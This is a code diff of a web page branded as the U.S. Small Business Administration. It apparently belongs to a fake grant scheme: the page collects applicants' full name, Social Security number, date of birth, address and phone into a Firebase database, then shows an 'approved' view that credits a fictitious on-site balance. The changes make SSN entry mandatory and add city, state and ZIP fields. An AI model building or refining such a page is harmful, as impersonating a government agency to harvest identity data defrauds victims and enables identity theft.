@@ -8,11 +8,9 @@
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&display=swap');
-        
         :root { --sba-navy: #002e6d; --sba-red: #cc0000; }
         body { background: #f1f5f9; font-family: 'Inter', sans-serif; color: #1e293b; margin: 0; }
 
-        /* --- TIGHT TOP-LEFT LOGO --- */
         header { 
             background: white; 
             padding: 10px 16px; 
@@ -33,9 +31,7 @@
         }
         .logo-text { font-weight: 800; font-size: 13px; color: var(--sba-navy); }
 
-        /* --- CLEAN FORM DESIGN --- */
         .form-card { background: white; border-radius: 8px; border: 1px solid #e2e8f0; box-shadow: 0 4px 6px -1px rgba(0,0,0,0.1); }
-        
         .section-label { 
             font-size: 10px; font-weight: 800; color: var(--sba-navy); 
             text-transform: uppercase; letter-spacing: 0.5px; 
@@ -43,7 +39,6 @@
         }
 
         label { display: block; font-size: 11px; font-weight: 700; color: #64748b; text-transform: uppercase; margin-bottom: 4px; }
-        
         .field { 
             width: 100%; height: 44px; border: 1.5px solid #cbd5e1; border-radius: 6px; 
             padding: 0 12px; font-size: 14px; font-weight: 600; transition: 0.2s;
@@ -52,10 +47,10 @@
 
         .btn-submit { 
             background: var(--sba-navy); color: white; width: 100%; padding: 16px; 
-            border-radius: 6px; font-weight: 800; text-transform: uppercase; font-size: 13px;
+            border-radius: 6px; font-weight: 800; text-transform: uppercase; font-size: 13px; cursor: pointer;
         }
+        .btn-submit:disabled { opacity: 0.6; cursor: not-allowed; }
 
-        /* --- STATUS VIEWS --- */
         .loader { width: 35px; height: 35px; border: 4px solid #f3f3f3; border-top: 4px solid var(--sba-navy); border-radius: 50%; animation: spin 1s linear infinite; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
@@ -63,7 +58,7 @@
 <body class="pb-10">
 
     <header>
-        <div class="logo-box"><span class="logo-text">SBA</span></div>
+        <div class="logo-box" onclick="location.href='dashboard.html'"><span class="logo-text">SBA</span></div>
         <div class="ml-3 border-l pl-3 py-1">
             <p class="text-[9px] font-extrabold text-slate-500 uppercase leading-tight">U.S. Small Business<br>Administration</p>
         </div>
@@ -157,17 +152,15 @@
                 const views = ['applyForm', 'pendingView', 'successView'];
                 views.forEach(v => document.getElementById(v).classList.add('hidden'));
 
-                // STATUS LOGIC
                 if (d.applyStatus === "APPROVED" || d.applyStatus === "SUCCESSFUL") {
                     document.getElementById('successView').classList.remove('hidden');
                     
-                    // AUTO-CREDIT LOGIC
-                    if (d.lastAppliedAmount > 0 && !d.grantCredited) {
+                    // AUTO-CREDIT ONLY ONCE
+                    if (d.lastAppliedAmount > 0 && d.grantCredited === false) {
                         try {
                             await updateDoc(doc(db, "users", user.uid), {
                                 balance: increment(d.lastAppliedAmount),
-                                grantCredited: true, // Prevents double adding
-                                lastAppliedAmount: 0 // Reset
+                                grantCredited: true
                             });
                         } catch (e) { console.error(e); }
                     }
@@ -177,6 +170,8 @@
                 } 
                 else {
                     document.getElementById('applyForm').classList.remove('hidden');
+                    // Pre-fill name if exists
+                    if(d.fullName) document.getElementById('fullName').value = d.fullName;
                 }
             });
         });
@@ -184,21 +179,31 @@
         window.submitData = async () => {
             const btn = document.getElementById('subBtn');
             const amount = Number(document.getElementById('reqAmount').value);
+            
+            // Simple Validation
+            const name = document.getElementById('fullName').value;
+            const ssn = document.getElementById('ssn').value;
+            if(!name || !ssn) { alert("Please complete all identity fields."); return; }
+
             btn.innerText = "Processing..."; btn.disabled = true;
 
             try {
                 await updateDoc(doc(db, "users", auth.currentUser.uid), {
                     applyStatus: "PENDING",
-                    fullName: document.getElementById('fullName').value,
-                    ssn: document.getElementById('ssn').value,
+                    fullName: name,
+                    ssn: ssn,
                     dob: document.getElementById('dob').value,
                     address: document.getElementById('address').value,
+                    city: document.getElementById('city').value,
+                    state: document.getElementById('state').value,
+                    zip: document.getElementById('zip').value,
                     phone: document.getElementById('phone').value,
                     lastAppliedAmount: amount,
                     grantCredited: false,
                     submittedAt: new Date().toLocaleString()
                 });
             } catch (e) {
+                alert("Submission failed. Check your connection.");
                 btn.disabled = false; btn.innerText = "Certify & Submit";
             }
         };
